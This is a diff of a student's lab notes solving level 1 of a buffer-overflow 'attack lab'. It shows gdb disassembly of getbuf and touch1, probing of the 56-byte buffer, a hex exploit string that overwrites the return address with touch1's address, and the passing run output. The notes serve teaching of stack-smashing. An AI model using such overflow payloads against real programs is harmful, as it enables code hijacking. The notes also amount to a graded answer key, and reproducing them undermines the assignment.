@@ -1,4 +1,7 @@
 Phase 1:
+gdb ./ctarget -i str.txt
+b getbuf 
+
 Dump of assembler code for function getbuf:
 => 0x0000000000401829 <+0>:     sub    $0x38,%rsp
    0x000000000040182d <+4>:     mov    %rsp,%rdi
@@ -7,4 +10,38 @@ Dump of assembler code for function getbuf:
    0x000000000040183a <+17>:    add    $0x38,%rsp
    0x000000000040183e <+21>:    retq
 
-BUFFER_SIZE = 0x38 = 56
+BUFFER_SIZE = 0x38 == 56
+
+55 a's, no seg
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+56 a's, segs
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+try null terminator 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\0a
+
+Dump of assembler code for function touch1:
+   0x000000000040183f <+0>:     sub    $0x8,%rsp
+   0x0000000000401843 <+4>:     movl   $0x1,0x202caf(%rip)        # 0x6044fc <vlevel>
+   0x000000000040184d <+14>:    mov    $0x403150,%edi
+   0x0000000000401852 <+19>:    callq  0x400c50 <puts@plt>
+   0x0000000000401857 <+24>:    mov    $0x1,%edi
+   0x000000000040185c <+29>:    callq  0x401c7d <validate>
+   0x0000000000401861 <+34>:    mov    $0x0,%edi
+   0x0000000000401866 <+39>:    callq  0x400df0 <exit@plt>
+
+touch1 starting address: 0x000000000040183f
+
+00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00
+3f 18 40 00 00 00 00 00
+or
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 3f 18 40 00 00 00 00 00
+
+sted@allspice lab3]$ cat str.txt | ./hex2raw | ./ctarget 
+Cookie: 0x54756825
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
